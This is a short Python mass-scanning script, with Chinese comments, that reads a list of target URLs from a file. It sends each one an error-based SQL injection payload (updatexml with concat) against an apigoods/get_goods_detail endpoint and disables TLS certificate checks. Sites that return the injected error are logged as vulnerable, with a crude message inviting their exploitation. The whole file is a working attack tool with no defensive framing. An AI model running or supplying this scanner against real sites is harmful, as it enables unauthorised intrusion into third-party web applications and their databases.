import requests
from datetime import datetime
import urllib3

# 关键代码：屏蔽 "未验证 HTTPS 请求" 的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    with open('./url.txt','r+') as f:
        payload = "/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)"
        for line in f:
            url = line.strip()
            if url.startswith('#'):
                continue
            elif not url.startswith(('https://','http://')):
                url = "http://"+url
            try:
                response = requests.get(url=url,verify=False,timeout=10)
                if response.status_code==200:
                    url_with_payload = url+payload
                    response_from_url_with_payload=requests.get(url=url_with_payload,verify=False)
                    if ":(" in response_from_url_with_payload.text and "错误位置" in response_from_url_with_payload.text:
                        print(f"[+] {url} Vulnerable to SQL injection")
                        print("you can fuck it!!!")
                        with open("./log/success.txt","a+") as success_log, open("./log/log.txt","a+") as log:
                            now = datetime.now()
                            str_now_with_success_log=f"[+] {url} Vulnerable to SQL injection"+"\t"+str(now)+"\n"+"you can fuck it!!!\n"
                            success_log.write(str_now_with_success_log)
                            log.write(str_now_with_success_log)
                    else:
                        print(f"[-] {url} Not Vulnerable to SQL injection")
                        with open("./log/log.txt","a+") as log:
                            now = datetime.now()
                            str_now_log=f"[-] {url} Not Vulnerable to SQL injection"+"\t"+str(now)+"\n"
                            log.writelines(str_now_log)
                else:
                    print(f"{url}:{response.status_code}")
            except Exception as e:
                print(f"异常:->{e}")


if __name__ == '__main__':
    main()